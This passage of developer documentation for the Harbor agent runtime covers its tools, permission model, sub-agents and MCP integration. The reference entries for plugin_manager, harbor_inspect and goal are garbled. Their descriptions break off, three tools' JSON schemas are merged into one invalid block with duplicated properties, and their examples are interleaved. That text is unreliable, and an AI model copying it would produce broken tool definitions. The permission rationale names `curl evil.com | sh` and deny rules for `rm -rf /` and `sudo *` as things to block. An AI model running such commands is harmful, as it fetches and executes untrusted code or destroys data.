{"server": "dev", "name": "commit", "arguments": {"style": "conventional"}}
```

**Permissions.** Ask (default). Same sandbox reasoning as `mcp`.

**Mode.** `Parallel` (read-only).

**Tips.**
- Discover prompts first: `mcp {"server": "dev", "method": "prompts/list"}`.
- Check a prompt's required `arguments` in the list output before rendering.

---

### `session_read`

**Description.** Reads a *peer* session — one spawned earlier by `task` or
otherwise running alongside the current one — and reports its status, its
outcome (if finished) and, optionally, the tail of its transcript. Read-only;
it never mutates the peer. Peer supervision was added in #165.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "id":                  { "type": "string",  "description": "Id of the peer session to inspect" },
    "limit":               { "type": "integer", "description": "Max transcript messages to return (default 20, max 50)" },
    "include_transcript":  { "type": "boolean", "description": "Include the recent transcript (default true)" }
  },
  "required": ["id"]
}
```

**Examples.**

```jsonc
// 1. Status only, no transcript
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE", "include_transcript": false}

// 2. Status + last 10 transcript messages
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE", "limit": 10}

// 3. Poll after spawning a sub-agent with `task`
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE"}
```

**Permissions.** Allow (default) — read-only, same sandbox class as `read`.

**Mode.** `Parallel` (read-only).

**Tips.**
- Only registered when a `ISessionStore` is wired into the host; without one
  the tool is absent and the call fails as an unknown tool name.
- Poll rather than re-`task` — a running peer keeps its context, a fresh `task` does not.
- `limit` is clamped to 50; the transcript is returned newest-first.

---

### `session_steer`

**Description.** Sends a directive to a *peer* session: a plain `message` to
inject, a `redirect` to change its current objective, or a `restart` to re-run
it with fresh input. The counterpart to `session_read` — same peer supervision
feature (#165).

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "id":          { "type": "string", "description": "Id of the peer session to steer" },
    "instruction": { "type": "string", "description": "The directive for the peer session" },
    "operation":   { "type": "string", "enum": ["message", "redirect", "restart"], "description": "Peer operation (default message)" }
  },
  "required": ["id", "instruction"]
}
```

**Examples.**

```jsonc
// 1. Inject a follow-up into a running peer
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE", "instruction": "Also check the retry paths."}

// 2. Redirect a peer that went down the wrong path
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE", "operation": "redirect", "instruction": "Stop refactoring; just report the failing tests."}

// 3. Restart a finished peer with a refined brief
{"id": "01HN8QK2M4P7R9T3V6X0Z5B1CDE", "operation": "restart", "instruction": "Same audit, but only under src/Harbor.Storage."}
```

**Permissions.** Ask (default) — it mutates a live peer session, which is a
side effect the user has not explicitly requested.

**Mode.** `Sequential` (mutates peer state).

**Tips.**
- Pair with `session_read`: poll first, steer only when the peer is off-track.
- `redirect` changes the objective mid-run; `restart` discards the peer's
  accumulated context — prefer `redirect` if the peer's findings are still useful.
- Same `ISessionStore` requirement as `session_read`.

---

### `plugin_manager`

**Description.** The agent's window onto the plugin inventory. It reads what is
installed in the two CS-source plugin scopes (`~/.harbor/plugins` and
`<cwd>/.harbor/plugins`), and it PROPOSES a change — install, uninstall, enable,
disable. The proposal is a question: the tool asks the user, through the same
approval channel the permission service uses, and the change happens only if the
user approves that one call. A denial, a cancellation or an unavailable approval
channel ends the call with nothing changed (#1738).
### `harbor_inspect`

**Description.** A read-only catalog of what THIS runtime offers: the tools it has
registered, the agents it can run, the providers it knows, the skills the model may
load, the plugin extension axes and what each route does with them, the versions
this build speaks, and the limits the current agent runs under.

The catalog is a **projection**, never a second registry. Every section reads the
registry that owns the fact — `IToolRegistry` for tools, `IAgentRegistry` for agents,
`IProviderRegistry` for registered providers, `ISkillRegistry` for skills — so the
answer describes the runtime that is running, not a list that was written down once.
The four facts no registry owns (the Harbor version, the plugin manifest schema
version, the extension axes with their verdicts, the provider catalogue) are copied
out of the product's own declarations by the composition root: the axes and their
reasons from `PluginRouteAxisRegistry` (#1723), the providers from `ProviderPresets`
(#580), the versions from `PluginRuntimeVersions`.
### `goal`

**Description.** Reports the agent's verdict on the session's *goal*: the
objective was met, or it cannot be reached from here (#1761). A goal is a
durable, phased record — `active` / `blocked` / `complete` — that lives in
the session log, so the phase survives a restart and the progress of a long
run is readable by anyone who opens the session.

**Args schema.**

```jsonc
{
  "type": "object",
  "properties": {
    "action": { "type": "string", "description": "What to do: 'list', 'install', 'uninstall', 'enable' or 'disable'" },
    "name":   { "type": "string", "description": "The plugin file name as 'list' reports it (e.g. 'TodoWrite.cs') — required for uninstall, enable and disable" },
    "source": { "type": "string", "description": "Path of the reviewed '.cs' plugin source to install — required for install" },
    "scope":  { "type": "string", "description": "Where to install: 'global' (~/.harbor/plugins) or 'project' (<cwd>/.harbor/plugins) — install only, default 'global'" }
  },
  "required": ["action"]
    "section": { "type": "string", "description": "Which part of the runtime to describe: overview (default), tools, agents, providers, skills, plugins, versions, limits" },
    "name":    { "type": "string", "description": "One entry of that section, by its exact name (tool, agent, provider id, skill, plugin axis). Omit to list the whole section." }
  }
    "operation": { "type": "string", "enum": ["complete", "block"], "description": "complete — the objective was met; block — it cannot be reached from here" },
    "reason":    { "type": "string", "description": "Why the goal is blocked (required for operation \"block\")" }
    "operation": { "type": "string", "enum": ["complete", "block"], "description": "complete - the objective was met; block - it cannot be reached from here" },
    "reason":    { "type": "string", "description": "Why the goal is blocked (required for operation 'block')" }
  },
  "required": ["operation"]
}
```

**Examples.**

```jsonc
// 1. What is installed?
{"action": "list"}

// 2. Add a reviewed plugin to the user's own scope
{"action": "install", "source": "/home/u/reviews/TodoWrite.cs"}

// 3. Add it to the project instead
{"action": "install", "source": "/home/u/reviews/TodoWrite.cs", "scope": "project"}

// 4. Take a plugin out
{"action": "uninstall", "name": "TodoWrite.cs"}

// 5. Keep it on disk but stop the host from serving it
{"action": "disable", "name": "TodoWrite.cs"}
```

**Permissions.** `PermissionRuleset.Default` allows the tool (`plugin_manager *`)
— that is NOT "the agent may install plugins on its own". The tool asks the user
about every change it proposes, and the answer covers that one call: it is never
written back to a ruleset, so the session's permission mode never changes. A
user who does not want an agent touching plugins writes
`new("plugin_manager", "*", Deny)` and the tool never starts. The read-only
agents (`plan`, `explore`, `ask`, `architect`, `orchestrator`) deny it outright.

**Mode.** `Sequential` (it changes files).

**Tips.**
- Call `action: "list"` first: it reports the exact file names the other
  actions take, and an error says so ("call list and use the exact file name").
- An install copies the reviewed source AND the manifest it ships next to it
  (`<Name>.harbor-plugin.json`); the manifest is the plugin's declaration, and
  the host refuses a plugin whose declaration it cannot apply.
- A plugin that declares a Harbor floor above the running one is refused with
  that reason — the host would refuse it at load time anyway.
- CS plugins are served by the separate `harbor-plugins-host` process: a change
  takes effect after that host restarts. Nothing is compiled in the CLI process.
// 1. What does this runtime have? (one screen)
{}

// 2. Which tools are registered, and what may this agent do with each?
{"section": "tools"}

// 3. One tool in full — description, guard and JSON schema
{"section": "tools", "name": "read"}

// 4. Which plugin axes exist, and does the route carry them?
{"section": "plugins"}
```

**Permissions.** Allow (default). Read-only by construction: the tool executes no
tool, starts no process, writes no file and mutates no registry. Its safety profile
is `Opaque` (it takes no path and no command) and its category is `Read`, so the
read-only agents may ask it what the runtime has.

**Mode.** `Parallel`.

**Tips.**
- The output is sized for a model's context: one line per entry, and the long tail
  (a full JSON schema, a full verdict reason) only when one entry is asked for by
  name.
- An unknown name answers with what exists — `No tool named 'reed'. Registered
  tools: bash, edit, glob, ...` — not with a bare "not found".
- The provider section carries no credential: not the key, not the environment
  variable that holds it. It says *whether* a key is required, and where to get one.
- Plugin tools arrive as MCP tools (the out-of-process route), so the `plugins`
  section names the axes and the MCP servers rather than listing plugin tools.
- The section also reads the live plugin composition the plugin host published
  (`inventory.json`, #1722) when there is one: the plugin's name, version,
  phase, the axes it carries and what each door it called did. The path comes
  from the host, never from the model.
// 1. The objective is met and verified
{"operation": "complete"}

// 2. Something outside the agent's reach blocks the work
{"operation": "block", "reason": "the CI service is unreachable from this host"}

// 3. A dependency the work needs is missing
{"operation": "block", "reason": "the task references a config file that does not exist"}
```

**Permissions.** Allow (default) — the agent's verdict on its own goal is a
report, not a workspace mutation. The read-only modes do not carry the rule,
so their goal tool is asked about rather than allowed, and their round prompt
does not name a tool the turn was not offered.

**Mode.** `Sequential` (it is a read-modify-write against the goal record).

**Tips.**
- Call it only when you have VERIFIED the objective — the verdict is a
  durable record, not a sentence in the transcript.
- `block` needs a `reason`: the reason is what the user reads to decide
  whether to unblock, escalate, or give up.
- The tool does not START a goal. The objective is the user's, and a model
  that could set its own objective would be marking its own homework.
- A backend that keeps no goals (the memory store, today) says so when the
  tool is called, rather than pretending a phase was set.

---

## 3. "When to use X vs Y" matrix

| You want to… | Use | Not | Why |
|---|---|---|---|
| Read file contents | `read` | `bash cat` | Line numbers + binary rejection + offset/limit |
| Find files by name | `glob` | `bash find` | Structured output + gitignore-aware |
| Find files by content (small repo) | `grep` | — | In-process, no external binary needed |
| Find files by content (large repo) | `ripgrep` | `grep` | 10–100× faster, gitignore-aware |
| Get a directory overview | `tree` | `bash ls -R` | Bounded depth, ASCII art, gitignore-aware |
| List one directory with sizes | `ls` | `bash ls` | Structured output with size+mtime |
| Single find/replace in a file | `edit` | `patch` | Simpler API, single operation |
| Multi-hunk / multi-block edit | `patch` | chained `edit` | Atomic, validated context, preview |
| Create a new file | `write` | `bash echo >` | Atomic write + parent dir creation |
| Run a build/test | `bash` | — | Only escape hatch for arbitrary commands |
| Fetch a URL | `webfetch` | `bash curl` | HTML→markdown conversion, byte cap, no shell injection |
| Remember something across turns | `notebook` | (nothing) | Persistent per-session JSON storage |
| Parallelize exploration | `task` | (nothing) | Spawns a sub-agent with its own context |
| Call an external MCP server | `mcp` | (nothing) | Only MCP bridge in the builtin set |
| Check on a sub-agent you spawned | `session_read` | a new `task` | Reuses the peer's live context instead of restarting it |
| Nudge a sub-agent off the wrong path | `session_steer` | (nothing) | Injects/redirects without discarding what the peer found |
| See what plugins are installed | `plugin_manager` (`action: "list"`) | `ls ~/.harbor/plugins` | One inventory for the agent and the `/plugins` panel |
| Add or remove a plugin | `plugin_manager` | `bash cp` | The change is proposed and the user approves it |
| Find out what this runtime offers | `harbor_inspect` | reading the docs | Reads the live registries, so it cannot describe a runtime that is not the one running |

---

## 4. Tool chains — common composition patterns

Harbor's agent loop dispatches `Parallel` tools concurrently within a single turn. This
makes tool chains that mix discovery (`glob`/`grep`/`tree`) + retrieval (`read`) very
fast. `Sequential` tools run after all parallel tools in a turn finish — that's where
side effects (`edit`/`write`/`bash`) belong.

### Chain 1 — read → edit → bash test

The classic TDD loop:

```jsonc
// Turn 1
[{"tool":"read", "args":{"path":"src/Calculator.cs"}}]

// Turn 2 (parallel-safe? no — edit is Sequential)
[{"tool":"edit", "args":{"path":"src/Calculator.cs","oldString":"return a + b;","newString":"return a + b + 1;"}}]

// Turn 3
[{"tool":"bash", "args":{"command":"dotnet run --project tests/Calculator.Tests -c Release"}}]
```

### Chain 2 — grep → read → patch

Find a pattern across files, read each hit, then apply a multi-hunk patch:

```jsonc
// Turn 1 — discover all callers (Parallel)
[{"tool":"grep", "args":{"pattern":"\\.Result\\b","include":"*.cs","maxResults":50}}]

// Turn 2 — read 5 of them in parallel (Parallel)
[
  {"tool":"read", "args":{"path":"src/A.cs","offset":40,"limit":20}},
  {"tool":"read", "args":{"path":"src/B.cs","offset":100,"limit":20}},
  {"tool":"read", "args":{"path":"src/C.cs","offset":15,"limit":20}}
]

// Turn 3 — patch each (Sequential, one per turn)
[
  {"tool":"patch", "args":{
    "path":"src/A.cs",
    "patch":"@@ -45,3 +45,3 @@\n-        var x = foo().Result;\n+        var x = await foo();\n"
  }}
]
```

### Chain 3 — tree → read → edit

Get a project overview, then drill into specific files:

```jsonc
// Turn 1 — see the structure
[{"tool":"tree", "args":{"path":".","maxDepth":3}}]

// Turn 2 — read the entry point and one promising file (Parallel)
[
  {"tool":"read", "args":{"path":"src/Program.cs"}},
  {"tool":"read", "args":{"path":"src/Agent.cs"}}
]

// Turn 3 — make a focused edit
[{"tool":"edit", "args":{"path":"src/Program.cs","oldString":"// TODO","newString":"Console.WriteLine(\"hi\");"}}]
```

### Chain 4 — webfetch → notebook (long-running research)

For long tasks where you need to remember findings across compaction boundaries:

```jsonc
// Turn 1 — fetch a doc page
[{"tool":"webfetch", "args":{"url":"https://example.com/docs/api","maxChars":30000}}]

// Turn 2 — stash the key bits
[{"tool":"notebook", "args":{"action":"set","key":"api-endpoints","content":"POST /v1/foo\nGET /v1/bar/:id"}}]

// Many turns later, after compaction may have evicted the original fetch…
[{"tool":"notebook", "args":{"action":"get","key":"api-endpoints"}}]
```

### Chain 5 — task (parallel exploration) → edit

Fan out exploration, then make a single informed edit:

```jsonc
// Turn 1 — explore (one task)
[{"tool":"task","args":{"agent":"explore","prompt":"Find every place that uses .Result on a Task in src/. Return file:line for each."}}]

// Turn N — edit one of the hits
[{"tool":"edit","args":{"path":"src/Foo.cs","oldString":"x.Result","newString":"(await x)"}}]
```

---

## 5. Building your own tool — WebFetchTool walkthrough

This section walks through the design of `WebFetchTool` end-to-end. The same recipe applies
to any new tool.

### Step 1 — Pick a name, namespace, and folder

```
src/Harbor.Tools.Builtin/Tools/WebFetch/WebFetchTool.cs
```

The convention is `<Name>/<Name>Tool.cs` with a `sealed` class. The tool name is lowercase
(`webfetch`); the class name is `<Name>Tool` (PascalCase). Use `ToolName.Create("webfetch")`
to construct the typed identifier.

### Step 2 — Implement `ITool`

```csharp
using System.Buffers;
using System.Net;
using System.Text.RegularExpressions;
using Harbor.Abstractions.Extensions;
using Microsoft.Extensions.Logging;
using Result = CSharpFunctionalExtensions.Result;

namespace Harbor.Tools.Builtin;

/// <summary>
///     Fetches a URL and returns its content as markdown ...
/// </summary>
public sealed class WebFetchTool : ITool
{
    // ── 1. Static config ─────────────────────────────────────────────
    private const int DefaultMaxChars = 50_000;
    private const int HardMaxChars    = 500_000;
    private const int MaxDownloadBytes = 5 * 1024 * 1024;
    private const int HttpTimeoutSeconds = 30;

    // ── 2. Process-wide shared resource ──────────────────────────────
    private static readonly HttpClient SharedClient = BuildClient();

    // ── 3. Dependencies (DI) ─────────────────────────────────────────
    private readonly ILogger<WebFetchTool> _logger;
    private readonly Func<HttpClient> _clientFactory;

    public WebFetchTool(ILogger<WebFetchTool> logger) : this(logger, () => SharedClient) {}

    // Test-friendly ctor — inject a mock HttpClient.
    public WebFetchTool(ILogger<WebFetchTool> logger, Func<HttpClient> clientFactory)
    {
        _logger = logger;
        _clientFactory = clientFactory;
    }

    // ── 4. ITool members ─────────────────────────────────────────────
    public ToolName Name => ToolName.Create("webfetch");
    public string DisplayName => "WebFetch";
    public string Glyph => "🌍";
    public string Description => "Fetch a URL and return markdown-converted content ...";
    public ExecutionMode ExecutionMode => ExecutionMode.Parallel;
    public ToolSafetyProfile SafetyProfile => ToolSafetyProfile.Opaque;
    public string? PromptSnippet => "webfetch: Fetch a URL and return markdown";

    public IReadOnlyList<string> PromptGuidelines { get; } =
    [
        "Use `webfetch` to read web pages, docs, JSON endpoints",
        "Pass `selector` to extract a single CSS-like element",
        "Default maxChars=50000; raise for long pages, lower for snippets",
        "Binary and >5 MiB responses are rejected"
    ];

    public JsonDocument ParameterSchema { get; } = JsonDocument.Parse("""
        {
          "type": "object",
          "properties": {
            "url":      { "type": "string",  "description": "Absolute URL (http or https)" },
            "selector": { "type": "string",  "description": "Optional CSS-like selector" },
            "maxChars": { "type": "integer", "description": "Max chars (default 50000, max 500000)" }
          },
          "required": ["url"]
        }
        """);

    // ── 5. Validate arguments ────────────────────────────────────────
    public Result ValidateArguments(JsonElement args)
    {
        if (!args.TryGetProperty("url", out var urlEl)
            || urlEl.ValueKind != JsonValueKind.String
            || string.IsNullOrWhiteSpace(urlEl.GetString()))
            return Result.Failure("Missing or empty 'url'.");

        string url = urlEl.GetString()!;
        if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)
            || (uri.Scheme != "http" && uri.Scheme != "https"))
        {
            return Result.Failure($"'url' must be an absolute http(s) URL: {url}");
        }
        return Result.Success();
    }

    // ── 6. Execute ───────────────────────────────────────────────────
    public async Task<ToolResult> ExecuteAsync(
        JsonElement args,
        ToolContext context,
        CancellationToken cancellationToken = default)
    {
        // ... read args, send HTTP, read body, convert to markdown, return ToolResult
    }
}
```

### Step 3 — Quality rules (must follow)

1. **`sealed` class** — prevents inheritance; tools are leaf strategies.
2. **`ITool` implementation** — all members: `Name`, `DisplayName`, `Glyph`,
   `Description`, `ParameterSchema`, `ExecutionMode`, `SafetyProfile`,
   `PromptSnippet`, `PromptGuidelines`, plus `ValidateArguments` + `ExecuteAsync`.
   `SafetyProfile` (#557) has no default and the compiler will refuse you without
   it. `Glyph` (#680) does default to a generic 🔧 — declare one if your tool has
   a natural icon, because the glyph travels with the call into every UI surface
   and no renderer keeps a table of tool names any more.
3. **`ConfigureAwait(false)`** everywhere — required for library code, avoids
   SynchronizationContext capture.
4. **`CancellationToken` threaded through** — never ignore; respect `context.Abort`.
5. **`ValidateArguments` returns `Result.Failure`** — never throws for bad input.
6. **`ExecuteAsync` catches expected exceptions** and returns `ToolResult.Error(message)` —
   never throws (the agent loop will wrap uncaught exceptions in a generic error anyway, but
   the message will be less useful).
7. **`ParameterSchema` uses raw-string `JsonDocument.Parse("""{ ... }""")`** — easy to read
   and edit, no string concatenation.
8. **XML docs on every public member** — the project has `<GenerateDocumentationFile>true</GenerateDocumentationFile>`
   and analyzers enforce it.
9. **`ArrayPool<byte>.Shared` / `StringBuilderPool.Rent()`** for buffers in hot paths —
   avoid per-call allocations of large arrays.
10. **Static shared resources** (HttpClient, regex caches) — never per-instance.

### Step 4 — Register in DI

In `src/Harbor.Hosting/Modules/ToolsCatalog.cs`'s `CreateToolRegistry`:

```csharp
tb.AddTool(lf => new WebFetchTool(lf.CreateLogger<WebFetchTool>()));
```

If your tool needs an injected dependency (like `McpToolTool` needs `IMcpRegistry`), either:

- Pass it as a ctor parameter (the eager-construct pattern, see McpToolTool):
  ```csharp
  tb.AddTool(new McpToolTool(mcpRegistry, loggerFactory.CreateLogger<McpToolTool>()));
  ```
- There is no third option: `ToolContext` does not expose a service provider at all
  (#470 removed it — the agent loop used to pass `null!`, so a per-call lookup could
  only ever return null or throw). Constructor injection is the only wiring path.

### Step 5 — Add a permission rule

In `src/Harbor.Abstractions.Contracts/Permissions/PermissionRuleset.cs`'s `Default`:

```csharp
new("webfetch", "*", PermissionAction.Ask),
```

Pick `Allow` only for tools that (a) have no side effects AND (b) cannot leak sensitive
data. `read`, `glob`, `grep`, `ls`, `tree`, `ripgrep`, `notebook` are Allow. Everything
else (writes, network, MCP) is at least `Ask`.

> **Reserved plugin-vocabulary names.** `PermissionRuleset.Default` also carries
> `session_broadcast` and `session_inbox` rules, and `BuiltinToolSafetyProfiles`
> declares `Opaque` profiles for them — but the builtin host never registers tools
> under those names. They exist so a plugin that loads later (peer-supervision
> style, issue #165) still finds its permission/safety row; there is no builtin
> `session_broadcast`/`session_inbox` tool to call. Do not add ad-hoc rules for
> names no tool registers — these two are the only exception, and
> `BuiltinToolSafetyDeclarationsTests` pins that.

### Step 6 — Write tests

In `tests/Harbor.Tools.Builtin.Tests/<Name>ToolTests.cs`. Cover:

1. `Name` and `ExecutionMode` (sanity).
2. `ValidateArguments` — missing required args, wrong types, out-of-range numbers.
3. Happy path — exercise the core code with a stub or temp file.
4. Error path — bad input, missing files, network failures, etc.
5. Edge cases — empty input, max-size limits, cancellation.

See `tests/Harbor.Tools.Builtin.Tests/WebFetchToolTests.cs` for the canonical pattern:
- Use `NullLogger<T>.Instance` for the logger.
- Use a `ToolContext` factory that returns `PermissionAction.Allow` and `Task.CompletedTask`.
- For HTTP-based tools, inject a custom `HttpMessageHandler` via the test ctor.

---

## 6. JSON Schema tips & common mistakes

The `ParameterSchema` you expose is what the LLM sees in its tool definition. A bad schema
makes the model call your tool wrong. Rules of thumb:

### DO

- **Describe every property.** A one-line `"description"` per field tells the model what to
  put there.
- **Mark required fields.** Use `"required": ["url"]` so the model doesn't omit them.
- **Use specific types.** `"integer"` for numbers, `"boolean"` for flags, `"object"` for
  nested args.
- **Add ranges in the description.** E.g. `"maxChars (default 50000, max 500000)"` — the
  model can read.
- **Use raw-string literals.** `JsonDocument.Parse("""{ ... }""")` keeps the schema
  readable and avoids string concatenation.

### DON'T

- **Don't use `"additionalProperties": false`** unless you really mean it — the model
  sometimes adds helpful extra context fields that get silently rejected.
- **Don't use `$ref`** — the model providers don't all resolve refs the same way. Inline
  everything.
- **Don't describe args in `Description` (the class-level one).** Per-property descriptions
  are more visible to the model.
- **Don't use `"enum"` for trivially-bounded strings** like `"get|set|add|clear|list"` —
  put it in the description instead and validate in `ValidateArguments`. Some model
  providers serialize enums weirdly.
- **Don't forget `"required": []`** when all fields are optional — an empty array is fine,
  but omitting it entirely makes some models believe all fields are required.

### Example: good vs bad

```jsonc
// BAD — model has to guess
{
  "type": "object",
  "properties": {
    "p": {"type": "string"},
    "n": {"type": "integer"}
  }
}

// GOOD — model knows what to send
{
  "type": "object",
  "properties": {
    "path":    {"type": "string",  "description": "Absolute or relative file path"},
    "maxChars": {"type": "integer", "description": "Max chars to return (default 50000, max 500000)"}
  },
  "required": ["path"]
}
```

---

## 7. Permission model — gotchas & rationale

`PermissionRuleset.Default` is a sorted list of `(permission, glob, action)` rules. The
evaluator walks from most-specific to least-specific and returns the first match. If
nothing matches, it falls back to `Ask`.

### Why `bash` asks for everything by default

`bash` is the universal escape hatch — it can do anything. The default ruleset allows a
small whitelist of read-only commands (`ls`, `cat`, `grep`, `rg`, `find`, `git status`,
`git diff`, `git log`) and denies `rm -rf /` and `sudo *` outright. Everything else
asks. This is correct: an agent that runs `curl evil.com | sh` without asking is a security
incident waiting to happen.

### Why `read`/`glob`/`grep`/`ls`/`tree`/`ripgrep`/`notebook`/`skill`/`harbor_inspect` are always Allow

These tools have no side effects and cannot leak data outside the local machine. They're
the agent's eyes — blocking them just slows things down without improving safety.

The exception is `notebook`, which DOES write to `~/.harbor/notes/<sessionId>.json`. But
the data is scoped to the session, lives in a known location, and the agent can only
write/append — never delete files outside that path. Allow is fine.

`harbor_inspect` is the same kind of eye: it reads the registries that are already in
memory and prints what they hold. It starts no process, writes no file and mutates no
registry, and its output carries no credential — the provider section says *whether* a
key is required, never the key and never the variable that holds it.

### Why `edit` denies `*.env` and `*.env.*`

Environment files commonly contain secrets (API keys, DB passwords). Even under `src/`,
the default ruleset denies `edit` on `*.env`, `*.env.local`, `*.env.production`, etc.
Override this in your agent's ruleset only if you have a secrets manager backing the file.

### Why `write` allows `src/*` but asks elsewhere

Source code under `src/` is the agent's primary work product — letting it write freely
there is the whole point. But `write` outside `src/` (e.g. `~/.bashrc`, `package.json`,
`Cargo.toml`) can break the user's environment in surprising ways — Ask is the right
default.

### Why `patch` mirrors `edit`'s permissions

`patch` is just a batch-mode `edit`. The same risk profile, the same defaults.

### Why `webfetch` and `mcp` are Ask

Both reach outside the local machine:
- `webfetch` leaks your IP and referer to whatever URL the agent picks.
- `mcp` can do anything the registered server's transport allows (filesystem access, DB
  queries, network calls).

Surfacing each call to the user is the safe default. If you trust a specific server, add
an explicit rule: `new("mcp:filesystem", "*", PermissionAction.Allow)` (note: the ruleset
matches `(permission, pattern)`, so you'd need to extend it to handle namespaced MCP
servers — currently MCP calls all use the `mcp` permission).

### How to override

Merge a custom ruleset on top of `Default`:

```csharp
var custom = new PermissionRuleset(new[]
{
    new PermissionRule("bash", "dotnet *", PermissionAction.Allow),
    new PermissionRule("bash", "git push *", PermissionAction.Deny)
});
var effective = PermissionRuleset.Default.Merge(custom);
```

User-supplied rules take precedence (last wins on duplicate `permission:pattern` keys).

---

## 8. Sub-agent delegation — `task` deep dive

`task` is the builtin that turns Harbor from a single-loop agent into a multi-agent system.
The mental model:

```
ParentAgent  ─┐
              ├─[task: explore]──> ExploreAgent  ──> (independent context window)
              │                   runs to completion
              │                   returns final message
              │
              ├─[task: plan]────> PlanAgent     ──> (independent context window)
              │                   runs to completion
              │                   returns final message
              │
              └─[continues with both results]
```

### Key properties

- **Sub-agents have their own context window.** They don't see the parent's messages. Pass
  a self-contained prompt.
- **Sub-agents have their own permission ruleset.** `explore` and `plan` are read-only by
  default — they can't `write` or `edit` even if the parent can.
- **Sub-agents report a single final message back.** Not their tool calls, not their
  streaming tokens — just the final assistant message text.
- **`task` is `Sequential`** so it doesn't race side-effect tools in the same turn.
- **You can fan out multiple `task` calls in one turn.** The agent loop dispatches them
  concurrently if they're `Parallel`... wait, no — `task` itself is `Sequential`, so they
  run one after another. (See [TODO: parallel sub-agent execution] in ROADMAP.md.)

### When to use `task`

- **Parallel exploration.** "Find every ITool impl and summarize each" →
  `task: explore`. The parent's context stays clean.
- **Isolate file ops.** "Generate a scratch file with 100 random records" →
  `task: code` (with a sub-agent whose ruleset allows writes to `tmp/*`).
- **Use a specialized agent.** `explore` is tuned for fast read-only codebase
  traversal; `plan` is tuned for design-first output.

### When NOT to use `task`

- **Trivial follow-ups.** If you just need to `read` 5 files, do it directly — `task`
  adds a round-trip and a context boundary.
- **Long-running work that needs streaming.** Sub-agents return only their final message;
  if you need progress updates, do the work in the parent loop.

### Sub-agent definition

See `src/Harbor.Abstractions/Agents/AgentDefinition.cs`. Built-in sub-agents:

- `explore` — read-only, smaller context, fast
- `plan` — read-only, smaller context, returns structured plans

Add your own by registering an `AgentDefinition` with `IsSubAgent: true` in your agent
registry. See `samples/plugins-cs/` for an example plugin that contributes a sub-agent.

---

## 9. MCP integration — adding an MCP server

Model Context Protocol (MCP) is an open standard for connecting AI tools to external data
sources and capabilities. Harbor's `mcp` builtin is a thin bridge: it looks up a server by
name in `IMcpRegistry` and forwards a JSON-RPC method call.

### Architecture

The MCP stack is fully implemented in `src/Harbor.Tools.Builtin/Tools/Mcp/`:

```
LLM  ──[tool: mcp, server="fs"]──>  McpToolTool  ──>  IMcpRegistry
                                                          │
                                        ┌─────────────────┴─────────────────┐
                                        ▼                                   ▼
                          ┌────────────────────────────┐    ┌────────────────────────┐
                          │  McpRegistry               │    │  InMemoryMcpRegistry   │
                          │  (Harbor.Tools.Mcp)        │    │  (Harbor.Registries,   │
                          │  - spawns child process    │    │   desktop Standard10   │
                          │  - JSON-RPC over stdio     │    │   fallback only)       │
                          │  - kills tree on dispose   │    └────────────────────────┘
                          └────────────────────────────┘
                                    │            │
                     McpProcessClient     McpJsonRpcTransport
                     (one subprocess      (framing + response
                      per server,          correlation)
                      stderr → logger)
```

- `IMcpRegistry` — `src/Harbor.Abstractions/Tools/IMcpRegistry.cs`
- `McpRegistry` (real impl, `IAsyncDisposable`) — `src/Harbor.Tools.Builtin/Tools/Mcp/McpRegistry.cs`
- `McpProcessClient` / `McpJsonRpcTransport` / `ProcessTree` — subprocess lifecycle + transport
- `IMcpTransportFactory` / `McpTransportResolver` — remote transport strategies
  (`src/Harbor.Tools.Builtin/Tools/Mcp/McpTransportFactory.cs`); builtins are
  `McpHttpTransportFactory` (`"http"`) and `McpSseTransportFactory` (`"sse"`)
- `McpServersConfigLoader` / `McpServersConfig` — config discovery (below)
- `McpToolAdapter` — wraps a single MCP tool as an `ITool` named `mcp_<server>_<tool>`

### Remote transports

The `transport` field of a remote (`url`) entry is resolved through
`McpTransportResolver` — a frozen name → `IMcpTransportFactory` table, not a
string comparison. Validation and dispatch read the *same* table, so a name
nobody registered can never reach the call site:

```jsonc
{"mcpServers": {"cloud": { "url": "https://mcp.example.com/mcp", "transport": "http" }}}
```

- Supported out of the box: `http` (streamable HTTP, the default when the field
  is absent or empty) and `sse` (legacy HTTP+SSE).
- An unknown or blank name is a **hard rejection**: `IMcpRegistry.Register`
  returns `Result.Failure` listing the accepted names, and the server is not
  registered. There is no silent fallback to another transport.
- Adding a transport kind is a registration, not an edit — implement
  `IMcpTransportFactory` and pass it through `HarborComposeOptions.McpTransports`
  (or a custom `McpTransportResolver` on the `McpRegistry` constructor). The
  resolver and every factory are published into the container, so hosts and
  plugins can enumerate the same set. Registering a name that shadows a builtin
  throws at composition time.

### Registering a server

Config-first: `ToolsCatalog.CreateMcpRegistry` (in `src/Harbor.Hosting/Modules/ToolsCatalog.cs`)
loads server definitions from standard `mcp.json` files in overlay order (later wins):

1. `$HARBOR_MCP_CONFIG` (explicit file), then
2. `~/.harbor/mcp.json`, then
3. `<project>/.harbor/mcp.json`

Supported schema (industry-standard `mcpServers` map; unknown fields ignored;
a legacy flat `"name": "command line"` form is also accepted):

```jsonc
// ~/.harbor/mcp.json
{
  "mcpServers": {
    "filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "${harborHome}"],
      "cwd": null,
      "env": { "GITHUB_TOKEN": "${GITHUB_TOKEN}" },
      "disabled": false,
      "instructions": "Read-only filesystem access under ${harborHome}"
    }
  }
}
```

- Macros `${projectRoot}`, `${home}`, `${harborHome}` are expanded in `command`, `args`,
  `cwd`, and `env` values (`McpServersConfigLoader.Expand`).
- `disabled: true` skips a server; missing files are treated as empty config, not errors.

Programmatic registration also works for custom hosts:

```csharp
var mcpRegistry = new Harbor.Tools.Mcp.McpRegistry(logger);
mcpRegistry.Register("filesystem", "npx -y @modelcontextprotocol/server-filesystem /tmp");
// or with full spawn control:
mcpRegistry.Register("github", new McpServerStartInfo { Command = "npx", Args = [...], Environment = ... });
```

### Discovering a server's API

After registering, the model can ask the server what it exposes:

```jsonc
{"tool":"mcp","args":{"server":"filesystem","method":"tools/list"}}
{"tool":"mcp","args":{"server":"filesystem","method":"resources/list"}}
{"tool":"mcp","args":{"server":"filesystem","method":"prompts/list"}}
```

Then call a specific tool:

```jsonc
{
  "tool":"mcp",
  "args":{
    "server":"filesystem",
